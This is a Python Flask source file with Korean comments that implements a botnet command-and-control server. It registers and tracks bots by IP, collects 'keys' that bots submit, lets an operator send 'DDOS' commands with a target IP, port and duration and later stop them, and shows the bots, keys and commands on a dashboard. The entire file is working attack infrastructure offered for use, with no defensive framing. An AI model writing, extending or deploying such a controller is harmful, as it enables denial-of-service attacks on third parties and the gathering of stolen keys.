from flask import Flask, request, render_template, redirect, url_for, jsonify
import sqlite3
import time

app = Flask(__name__)

# 데이터베이스 초기화
def init_db():
    conn = sqlite3.connect('data/botnet.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bots (id INTEGER PRIMARY KEY, ip TEXT, status TEXT, last_seen REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (id INTEGER PRIMARY KEY, key TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY, command TEXT)''')
    conn.commit()
    conn.close()

# 봇 등록
@app.route('/register_bot', methods=['POST'])
def register_bot():
    ip = request.json.get('ip')
    timestamp = time.time()
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('INSERT INTO bots (ip, status, last_seen) VALUES (?, ?, ?)', (ip, 'idle', timestamp))
    conn.commit()
    conn.close()
    return {'message': 'Bot registered successfully'}, 200

# 봇 상태 업데이트
@app.route('/update_bot', methods=['POST'])
def update_bot():
    ip = request.json.get('ip')
    timestamp = time.time()
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('UPDATE bots SET last_seen = ? WHERE ip = ?', (timestamp, ip))
    conn.commit()
    conn.close()
    return {'message': 'Bot updated successfully'}, 200

# 키 저장
@app.route('/store_key', methods=['POST'])
def store_key():
    key = request.json.get('key')
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('INSERT INTO keys (key) VALUES (?)', (key,))
    conn.commit()
    conn.close()
    return {'message': 'Key stored successfully'}, 200

# 명령 전송
@app.route('/send_command', methods=['POST'])
def send_command():
    bot_id = request.form['bot_id']
    target_ip = request.form['target_ip']
    target_port = request.form['target_port']
    duration = request.form['duration']
    command = f'DDOS {target_ip} {target_port} {duration}'
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('UPDATE bots SET status = ? WHERE id = ?', ('attacking', bot_id))
    c.execute('INSERT INTO commands (command) VALUES (?)', (command,))
    conn.commit()
    conn.close()
    return redirect(url_for('index'))

# 명령 종료
@app.route('/stop_command', methods=['POST'])
def stop_command():
    bot_id = request.form['bot_id']
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('UPDATE bots SET status = ? WHERE id = ?', ('idle', bot_id))
    c.execute('INSERT INTO commands (command) VALUES (?)', ('STOP',))
    conn.commit()
    conn.close()
    return redirect(url_for('index'))

# 명령 수신
@app.route('/get_command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('SELECT command FROM commands ORDER BY id DESC LIMIT 1')
    command = c.fetchone()
    conn.close()
    return {'command': command[0]} if command else {'command': ''}

# 오래된 봇 제거
def remove_inactive_bots():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    cutoff = time.time() - 600  # 10분 동안 응답이 없는 봇 제거
    c.execute('DELETE FROM bots WHERE last_seen < ?', (cutoff,))
    conn.commit()
    conn.close()

# 키 및 명령 관리 페이지
@app.route('/')
def index():
    remove_inactive_bots()
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('SELECT * FROM bots')
    bots = c.fetchall()
    c.execute('SELECT * FROM keys')
    keys = c.fetchall()
    c.execute('SELECT * FROM commands')
    commands = c.fetchall()
    conn.close()
    return render_template('index.html', bots=bots, keys=keys, commands=commands)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=80)
